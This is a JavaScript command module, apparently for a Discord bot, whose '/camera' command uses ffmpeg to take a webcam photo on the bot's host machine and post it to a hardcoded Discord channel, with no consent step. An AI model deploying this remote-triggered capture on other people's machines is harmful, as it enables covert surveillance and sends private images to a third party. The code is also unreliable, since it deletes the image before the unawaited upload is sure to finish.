const { SlashCommandBuilder } = require('discord.js');
const { exec } = require('child_process');
const fs = require('fs');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('camera')
        .setDescription('Takes a photo using the user\'s webcam and sends it to a specific channel'),
    async execute(interaction) {
        await interaction.deferReply({ ephemeral: true });

        const screenshotPath = './webcam_photo.png';
        const cmd = `ffmpeg -f dshow -i video="Logitech StreamCam" -vframes 1 ${screenshotPath}`;

        exec(cmd, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
                interaction.editReply('There was an error trying to capture the image.');
                return;
            }
            if (stderr) {
                console.error(`Stderr: ${stderr}`);
            }

            const targetChannel = interaction.guild.channels.cache.get('747063193129582682');
            if (!targetChannel) {
                interaction.editReply('The specified channel was not found.');
                return;
            }

            targetChannel.send({ files: [screenshotPath] });
            interaction.editReply('Photo has been taken and sent to the specified channel.');

            fs.unlinkSync(screenshotPath);
        });
    }
};